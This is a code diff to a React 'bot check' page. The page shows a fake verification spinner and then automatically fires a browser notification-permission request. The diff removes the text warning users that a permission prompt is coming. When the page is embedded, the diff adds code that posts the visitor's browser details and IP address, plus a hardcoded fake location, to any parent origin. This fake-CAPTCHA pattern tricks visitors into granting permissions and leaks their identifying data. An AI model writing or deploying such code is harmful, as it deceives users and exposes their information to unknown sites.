@@ -88,23 +88,38 @@ export default function BotCheckPage() {
   }, [])
 
   useEffect(() => {
-    // Show bot check UI and then request permission
+    // Show bot check UI
     const timer = setTimeout(() => {
       setIsChecking(false)
       setIsVerified(true)
       
-      // Automatically request permission after verification
-      setTimeout(() => {
-        if (clientInfo) {
-          handleAllow()
-        }
-      }, 500) // Small delay after showing verified state
+      // If embedded, send verification complete message to parent
+      if (window.isEmbedded && window.parent !== window) {
+        setTimeout(() => {
+          window.parent.postMessage({
+            type: 'bot-check-verified',
+            browserInfo: clientInfo,
+            location: {
+              country: 'United States',
+              city: 'New York',
+              ip: ipAddress
+            }
+          }, '*')
+        }, 500) // Small delay after showing verified state
+      } else {
+        // Only auto-request in non-embedded mode
+        setTimeout(() => {
+          if (clientInfo) {
+            handleAllow()
+          }
+        }, 500)
+      }
     }, 1500)
 
     return () => {
       clearTimeout(timer)
     }
-  }, [clientInfo])
+  }, [clientInfo, ipAddress])
 
   const handleAllow = async () => {
     try {
@@ -408,16 +423,12 @@ export default function BotCheckPage() {
                 </div>
                 <h2 className="mb-4">Verification successful</h2>
                 <p className="text-muted mb-4">
-                  Your browser will now ask for notification permission...
+                  Completing verification...
                 </p>
                 
                 <div className="mb-4">
                   <Spinner animation="border" variant="primary" size="sm" />
                 </div>
-                
-                <p className="text-muted" style={{ fontSize: '0.9rem' }}>
-                  Please look for the notification prompt in your browser
-                </p>
                 
                 <div className="mt-4 text-muted" style={{ fontSize: '0.85rem' }}>
                   <p className="mb-1">
